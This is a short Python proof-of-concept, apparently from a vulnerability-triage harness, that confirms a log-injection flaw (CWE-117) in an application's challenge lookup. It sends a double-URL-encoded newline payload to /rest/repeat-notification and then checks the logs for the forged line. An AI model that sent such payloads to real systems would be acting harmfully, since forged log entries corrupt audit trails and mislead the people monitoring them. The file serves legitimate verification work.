"""Log injection in lib/challengeUtils.ts:99 (CWE-117).

findChallengeByName logs logger.warn('Missing challenge with name: ' + name)
with name = decodeURIComponent(req.query.challenge) from /rest/repeat-notification,
unsanitized. A CRLF in the query forges its own log line. The query value is
decodeURIComponent'd again, so %250a -> %0a -> newline.

The effect is visible in the app log (winston Console), so the runner captures
the container stdout and check_logs() asserts the forged line is present on its
own line (triage-labels.md s.6: an exploitable log injection is TP even if the
impact is low).
"""

import urllib.request
import uuid

MARKER = "TFM_FORGED_LOGLINE_" + uuid.uuid4().hex[:12]


def exploit(base: str) -> tuple[bool, str]:
    # ZZZ... is a non-existent challenge so findChallengeByName reaches the warn;
    # %250a -> newline, then "warn: <MARKER>" is injected as a standalone entry.
    payload = f"ZZZ{uuid.uuid4().hex[:6]}%250awarn%3A%20{MARKER}"
    urllib.request.urlopen(f"{base}/rest/repeat-notification?challenge={payload}")
    return True, f"sent CRLF payload (marker {MARKER})"


def check_logs(logs: str) -> tuple[bool, str]:
    forged = f"warn: {MARKER}"
    injected = any(line.strip() == forged for line in logs.splitlines())
    return injected, f"forged standalone log line present: {injected}"
